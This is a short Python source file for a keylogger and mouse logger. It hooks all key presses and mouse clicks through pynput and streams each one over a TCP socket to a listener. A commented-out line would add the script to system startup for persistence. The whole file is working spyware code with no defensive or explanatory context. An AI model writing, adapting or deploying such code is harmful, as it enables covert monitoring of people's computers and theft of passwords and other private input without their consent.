from pynput import mouse,keyboard
from _thread import start_new_thread
from socket import *

#import rayanoos
import sys
#rayanoos.tools().reg_add_to_startup('blue',sys.argv[0])
s=socket(AF_INET,SOCK_STREAM)
s.connect((b'127.0.0.1',1222))

def mouse_log(x,y,buttom,pressed):

    if pressed == True:

        s.send( ('m(%s,%s) : %s'%(str(x),str(y),str(buttom)).encode('utf-8'))
        #print(x,y,buttom)
def mouse_start(ID):
    with mouse.Listener(on_click = mouse_log ) as lstn:
        lstn.join()

list_key=[]
def keyboard_log(key):
    #print(list_key)
    if type(key) == keyboard._xorg.KeyCode:
        k=key.char
    else:
        k=' ' +str( key)+ ' '    
    print(k)
    s.send( ( 'k' +str(key) ).encode('utf-8') )
    #list_key.append(key)
    #print(list_key)


def keyboard_start(ID):
    with keyboard.Listener(on_press = keyboard_log) as lstn:
        lstn.join()



start_new_thread (keyboard_start,tuple([1]))
#mouse_start()        
start_new_thread (mouse_start,tuple([2]) )
while True:
    pass